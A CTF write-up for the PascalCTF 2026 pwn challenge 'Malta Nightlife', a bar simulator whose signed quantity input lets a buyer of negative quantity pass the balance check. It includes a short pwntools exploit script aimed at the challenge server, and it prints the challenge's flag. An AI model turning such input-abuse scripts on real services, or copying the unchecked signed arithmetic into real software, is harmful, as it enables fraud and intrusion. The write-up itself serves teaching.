---
ctf: PascalCTF 2026
category: pwn
difficulty: easy
points: 442
flag: pascalCTF{St0p_dR1nKing_3ven_1f_it5_ch34p}
techniques:
  - integer-overflow
  - negative-quantity
  - logic-bypass
tools:
  - python
  - pwntools
---

# Malta Nightlife

## Description

"You've never seen drinks this cheap in Malta, come join the fun!"

**Category:** pwn  
**Points:** 442  
**Solves:** 19

## Solution

This challenge presents a cocktail bar simulator where players can buy drinks with a starting balance of 100 €. The menu includes various drinks priced between 3-6 €, but there's a special "Flag" drink that costs 1,000,000,000 €.

### Binary Analysis

Security features:
- No PIE (fixed addresses)
- No stack canary
- NX enabled
- Partial RELRO

### Vulnerability

The vulnerability lies in the quantity input validation. When purchasing a drink, the program:

1. Reads the drink choice (1-10, where 10 is the Flag)
2. Reads the quantity via `scanf("%d")` - a **signed integer**
3. Calculates total cost: `quantity * price`
4. Checks if `balance >= total_cost`
5. Subtracts the total cost from balance

The flaw is that **negative quantities are accepted**. When we input a negative quantity:
- `quantity * price` becomes negative (e.g., `-1 * 1000000000 = -1000000000`)
- The comparison `balance >= negative_number` is always true (`100 >= -1000000000`)
- The program "sells" us the drink and reveals its "secret recipe" (the flag)

### Exploit

Simply select drink 10 (Flag) and enter quantity **-1**:

```python
from pwn import *

p = remote('malta.ctf.pascalctf.it', 9002)

# Navigate menu
p.sendlineafter(b'>', b'2')  # Buy drinks
p.sendlineafter(b'>', b'10') # Select Flag drink
p.sendlineafter(b'>', b'-1') # Negative quantity

p.interactive()
```

The program outputs the flag in the "secret recipe" field.

## Key Techniques

- Integer overflow exploitation
- Signed integer abuse
- Logic flaw in cost validation

